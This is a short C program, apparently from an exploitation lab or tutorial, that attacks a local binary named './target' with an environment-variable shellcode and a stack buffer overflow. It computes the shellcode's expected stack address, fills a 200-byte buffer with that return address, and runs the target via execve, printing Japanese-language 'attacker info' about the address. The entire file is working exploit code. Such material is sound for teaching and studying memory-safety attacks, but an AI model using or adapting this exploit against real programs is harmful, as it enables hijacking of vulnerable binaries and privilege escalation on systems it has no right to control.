#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include"shellcode.h"

int main(void){
	unsigned int i, ret;
	char *buffer, *target_filename = "./target";

	ret = 0xffffdff6 - (sizeof(shellcode) - 1) - strlen(target_filename);
	buffer = malloc(200);
	for(i = 0; i < 200; i += 4) *((unsigned int*) (buffer + i)) = ret;

	printf("##### 攻撃者の情報 #####\n");
	printf("%s という名前の実効形式に %ubit のシェルコードを環境変数に持たせて実行する場合、シェルコードの先頭アドレスは %x になると思われます\n\n", target_filename, sizeof(shellcode) - 1, ret);

	char *arg[3] = {target_filename, buffer, NULL};
	char *env[2] = {shellcode, NULL};
	execve(target_filename, arg, env);

	free(buffer);
	return 0;
}
